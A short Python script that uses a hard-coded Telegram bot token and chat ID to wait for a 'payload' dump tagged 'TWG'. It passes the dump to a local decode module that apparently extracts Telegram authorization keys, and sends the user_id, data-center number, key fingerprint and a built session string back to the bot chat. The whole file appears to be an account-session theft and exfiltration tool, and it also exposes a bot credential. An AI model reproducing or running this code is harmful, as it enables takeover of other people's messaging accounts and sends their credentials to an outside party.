import json, os, sys, urllib.request, urllib.parse, hashlib

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import decode as D

BOT = '8610466101:AAGrgL8oIrBRBDHsV0M_dC2mqwU7MKaZF5k'
CHAT = '8314393607'
TAG = 'TWG'
API = 'https://api.telegram.org/bot' + BOT + '/'
offset = None


def call(method, **p):
    data = urllib.parse.urlencode(p).encode()
    with urllib.request.urlopen(API + method, data, timeout=90) as r:
        return json.load(r)


def poll(timeout):
    global offset
    p = {'timeout': timeout, 'allowed_updates': json.dumps(['message'])}
    if offset is not None:
        p['offset'] = offset
    for u in call('getUpdates', **p).get('result', []):
        offset = u['update_id'] + 1
        yield u


def fetch(fid):
    fp = call('getFile', file_id=fid)['result']['file_path']
    with urllib.request.urlopen('https://api.telegram.org/file/bot' + BOT + '/' + fp, timeout=90) as r:
        return r.read().decode('utf-8', 'replace')


def main():
    while True:
        got = list(poll(0))
        if not got:
            break
    print('en attente du payload (max 3 min)...')

    for _ in range(60):
        for u in poll(20):
            m = u.get('message') or {}
            txt = m.get('text') or m.get('caption') or ''
            if TAG not in txt and not m.get('document'):
                continue
            raw = fetch(m['document']['file_id']) if m.get('document') else txt[txt.index('{'):]
            dump = json.loads(raw)
            cands = D.extract(dump)
            if not cands:
                print('aucune cle. Extrait :', raw[:600])
                call('sendMessage', chat_id=CHAT, text='TWG aucune cle trouvee')
                return
            ss = D.main(dump)
            call('sendMessage', chat_id=CHAT,
                 text='TWG OK\nuser_id=' + str(D.user_id(dump)) + '\ndc=' + str(cands[0]['dc']) +
                      '\nfp=' + hashlib.sha1(cands[0]['key']).hexdigest()[:12] + '\n\n' + ss)
            print('envoye au bot.')
            return
    print('rien recu.')


main()
